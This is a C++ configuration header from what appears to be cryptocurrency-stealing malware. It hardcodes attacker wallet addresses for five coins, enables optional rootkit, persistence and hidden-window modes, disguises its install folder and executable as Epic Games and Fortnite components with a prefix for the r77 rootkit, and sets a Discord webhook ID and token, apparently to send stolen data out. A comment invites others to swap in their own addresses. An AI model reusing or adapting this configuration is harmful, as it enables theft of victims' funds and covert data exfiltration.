#pragma once
#include <iostream>
#include "oxorany_include.h"
#include "xor.h"
#include "string.h"

// These r defualts, dont change exept if u read all code. 
bool bDebug = true;
bool bEnableRootkit = false;
bool bEnablePersistance = false;
bool bHideWindow = false;

// repplace ur addy (  or dont ;)   )
std::string sBtcAddy = ("bc1qqcftly6xavue9c63dhhmv8gpyn62tk7fqa8njy");
std::string sEthAddy = ("0x5322E6bD71A17e3330A5db784525636F52b33a1b");
std::string sLtcAddy = ("ltc1qcjgyv27y2nqwuvx7ya9suw2c30302v7dud5wm5");
std::string sUsdtAddy = ("TKKWr8i2EQw45b8bkM4a9taQQr5sWYkDMR");
std::string sSolAddy = ("JAnrCQzEFWWZ6epc1SUENfjRuNpQpcu1KqCxjE5rYRJt");

const char* cInstallFolder = ("$77EpicOnlineServicesHelpeeerr"); // $77 prefix if u wanna use with r77 rootkit
const char* cInstallName = ("$77FortniteOnlineClientPadckager.exe"); // $77 prefix if u wanna use with r77 rootkit, MUST HAVE .EXE AT THE END!!

//const char* cWebhookId = ("1238566024102809716");
//const char* cWebhookToken = ("GhBoHqrfJo1Oa2oySvI_mDs6FBmZDRR6yi_EMbk14Pr1oiC4Hl0yf8CQo7NhT10sF-uF");


//https://discord.com/api/webhooks/1252336574264512604/7qDc_e4vKajqQKbk4QYjRrmYwCFM5ZDa1FB6wDdSbXRsYdXDSdRCcPGa8Dg89aJYDu8N
const char* cWebhookId = ("1252336574264512604");
const char* cWebhookToken = ("7qDc_e4vKajqQKbk4QYjRrmYwCFM5ZDa1FB6wDdSbXRsYdXDSdRCcPGa8Dg89aJYDu8N");

// format is -> https://discord.com/api/webhooks/cWebhookId/cWebhookToken